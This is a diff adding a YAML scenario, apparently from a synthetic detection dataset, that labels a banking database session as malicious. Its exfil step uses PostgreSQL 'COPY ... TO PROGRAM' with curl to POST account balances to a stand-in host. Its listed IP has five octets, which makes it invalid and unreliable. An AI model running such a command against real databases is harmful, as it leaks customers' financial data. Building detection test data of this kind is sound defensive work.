@@ -1,0 +1,32 @@
+scenario_id: gen_banking_49_sql_injection_mal_1275m
+family_id: gen_banking_49_sql_injection_fam_1275
+domain: banking
+time_of_day: 04:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT balance FROM accounts WHERE customer_id > 134712
+  - step_id: exfil
+    sql: COPY (SELECT balance FROM accounts) TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 193.42.33.154.137
+      port: 8080
+matched_pair_id: gen_banking_49_sql_injection_pair_1275
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
